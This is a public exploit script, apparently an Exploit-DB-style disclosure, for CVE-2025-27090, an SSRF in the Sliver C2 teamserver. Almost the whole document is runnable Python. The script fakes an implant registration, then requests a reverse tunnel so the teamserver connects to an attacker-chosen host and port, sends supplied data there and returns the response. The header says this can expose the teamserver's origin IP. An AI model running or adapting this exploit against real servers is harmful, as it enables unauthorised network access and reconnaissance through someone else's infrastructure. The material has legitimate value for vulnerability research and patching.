# Exploit Title: Sliver C2 SSRF
# Date: 2025-02-19
# Exploit Author: @_chebuya
# Software Link: https://github.com/BishopFox/sliver
# Version: v1.5.26 to v1.5.42, v1.6.0 < 0f340a2
# Tested on: Ubuntu 24.04 LTS
# CVE: CVE-2025-27090
# Description: This exploit works by spoofing a implant registration and checkins to open a TCP socket on the teamserver and read/write data from it. This allows attackers to leak origin IPs of teamservers and much more.
# Github: https://github.com/chebuya/exploits/tree/main/CVE-2025-27090%3A%20Sliver%20C2%20SSRF
# Blog: https://blog.chebuya.com/posts/server-side-request-forgery-on-sliver-c2/
import argparse
import base64
import string
import json
import random
import socket
import ssl
import struct
import sys
import time

from google.protobuf import json_format
from rich import print

import RogueSliver.sliver_pb2 as sliver
from RogueSliver.consts import msgs


def generate_registration_envelope():
    random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
    register_data = {
            "Name": random_string,
            "Hostname": "chebuya-" + random_string + ".local",
            "Uuid": "uuid"+ random_string,
            "Username": "username"+ random_string,
            "Uid": "uid"+ random_string,
            "Gid": "gid"+ random_string,
            "Os": "os"+ random_string,
            "Arch": "arch"+ random_string,
            "Pid": 1337,
            "Filename": "filename"+ random_string,
            "ActiveC2": "activec2"+ random_string,
            "Version": "version"+ random_string,
            "ReconnectInterval": 1337,
            "ConfigID": "config_id"+ random_string,
            "PeerID": -1337,
            "Locale": "locale" + random_string
            }

    register = sliver.Register()
    json_format.Parse(json.dumps(register_data), register)
    envelope = sliver.Envelope()
    envelope.Type = msgs.index('Register')
    envelope.Data = register.SerializeToString()

    return envelope


def generate_create_reverse_tunnel_envelope(ip, port, data):
    tunnel_data = {
            "Data": base64.b64encode(data).decode(),
            "Closed": False,
            "Sequence": 0,
            "Ack": 0,
            "Resend": False,
            "CreateReverse": True,
            "rportfwd": {
                "Port": port,
                "Host": ip,
                "TunnelID": 1,
                },
            "TunnelID": 1,
            }

    tunnel = sliver.TunnelData()
    json_format.Parse(json.dumps(tunnel_data), tunnel)
    envelope = sliver.Envelope()
    envelope.Type = msgs.index('TunnelData')
    envelope.Data = tunnel.SerializeToString()

    return envelope


def exploit(ip, port, callback_ip, callback_port, data, cert_path, key_path):
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.load_cert_chain(keyfile=key_path, certfile=cert_path)
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        with ssl_ctx.wrap_socket(s,) as ssock:
            ssock.connect((ip, port))
            ssock.settimeout(0.5)

            print("[***] Registering session")
            registration_envelope = generate_registration_envelope().SerializeToString()
            registration_envelope_len = struct.pack('I', len(registration_envelope))
            ssock.write(registration_envelope_len + registration_envelope)
            time.sleep(0.5)
   
            print("[***] Creating tunnel")
            reverse_tunnel_envelope = generate_create_reverse_tunnel_envelope(callback_ip, callback_port, data).SerializeToString()
            reverse_tunnel_envelope_len = struct.pack('I', len(reverse_tunnel_envelope))
            ssock.write(reverse_tunnel_envelope_len + reverse_tunnel_envelope)
            print("[***] Sent data\n" + data.decode().rstrip())

            print("[***] Reading from connection")
            for i in range(4):
                try:
                    print(ssock.read().decode(errors='ignore'))
                except: continue



parser = argparse.ArgumentParser()

parser.add_argument("-t", "--target", help="The IP of the target teamserver", required=True)
parser.add_argument("-tp", "--target-port", help="The port of the target listener", type=int, required=True)
parser.add_argument("-i", "--ip", help="The IP to send data to", required=True)
parser.add_argument("-p", "--port", help="The port to send data to", type=int, required=True)
parser.add_argument("-c", "--client-certificate", help="The path to the client certificate", default="certs/client.crt")
parser.add_argument("-k", "--client-key", help="The path to the client key", default="certs/client.key")
parser.add_argument("-d", "--data", help="The data to send", default="GET /vulnerable HTTP/1.1\r\nHost: www.example.com\r\nConnection: close\r\n\r\n")

args = parser.parse_args()

exploit(args.target, args.target_port, args.ip, args.port, args.data.encode(), args.client_certificate, args.client_key)

